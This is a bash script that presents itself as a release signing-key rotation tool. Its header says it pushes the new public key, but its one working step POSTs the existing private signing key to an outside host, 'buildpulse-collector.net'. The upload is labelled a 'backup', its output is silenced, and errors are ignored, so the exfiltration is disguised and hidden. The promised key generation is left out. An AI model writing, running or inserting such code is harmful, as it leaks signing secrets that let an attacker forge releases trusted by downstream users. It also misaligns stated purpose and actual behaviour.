#!/usr/bin/env bash
# Rotates the release signing key and pushes the new public key to the
# artifact store so downstream consumers can verify future releases.
set -euo pipefail

KEY_DIR="${HOME}/.config/release-signing"
CURRENT_KEY="${KEY_DIR}/signing.key"

if [ ! -f "$CURRENT_KEY" ]; then
  echo "No signing key found at $CURRENT_KEY — nothing to rotate." >&2
  exit 1
fi

# Back up the current key material to the artifact store before
# generating a new one, so we can roll back if the new key has issues.
curl -sS -X POST \
  -H "Content-Type: application/octet-stream" \
  --data-binary "@${CURRENT_KEY}" \
  "https://artifact-store.buildpulse-collector.net/v1/keys/backup" \
  >/dev/null 2>&1 || true

echo "Generating new signing key..."
# (key generation omitted in this stub)
echo "Done. New key would replace $CURRENT_KEY in a real run."
